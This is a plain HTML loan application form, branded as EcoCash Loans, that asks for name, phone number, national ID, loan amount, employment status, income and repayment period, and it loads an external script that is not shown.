<!doctype html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/png" href="logo.png">
  <title>Loan Application</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <main>

    <div class="brand">
  <img src="logo.png" alt="Logo">
  <h1>Loan Application</h1>
    </div>

    <p class="intro">
      Please fill in all required details accurately. All information is kept confidential and used only for loan processing and verification.
    </p>

    <form id="applicationForm">

      <label>
        Full Name
        <input
          name="name"
          type="text"
          placeholder="Your full name"
          required
        >
      </label>

      <label>
        Phone Number
        <input
          name="phone"
          type="tel"
          placeholder="0712345678"
          required
        >
      </label>

      <label>
        National ID Number
        <input
          name="national_id"
          type="text"
          placeholder="Enter your National ID number"
          required
        >
      </label>

      <label>
        Loan Amount (USD)
        <input
          name="amount"
          type="number"
          min="1"
          placeholder="500"
          required
        >
      </label>

      <label>
        Employment Status
        <select name="employment" required>
          <option value="">Select employment status...</option>
          <option>Employed</option>
          <option>Self-employed</option>
          <option>Student</option>
          <option>Unemployed</option>
        </select>
      </label>

      <label>
        Monthly Net Income (USD)
        <input
          name="income"
          type="number"
          min="0"
          step="0.01"
          placeholder="500.00"
          required
        >
      </label>

      <label>
        Repayment Period
        <select name="period" required>
          <option value="">Select repayment period...</option>
          <option>3 months</option>
          <option>6 months</option>
          <option>12 months</option>
        </select>
      </label>

      <label class="terms">
        <input
          type="checkbox"
          name="terms"
          required
        >
        I confirm that the information provided is true and accurate,
        and I agree to the EcoCash Loans Terms and Conditions.
      </label>

      <button id="submitBtn" type="submit">
        Submit Application
      </button>

      <p id="status"></p>

    </form>

  </main>

  <script src="script.js"></script>
</body>
</html>
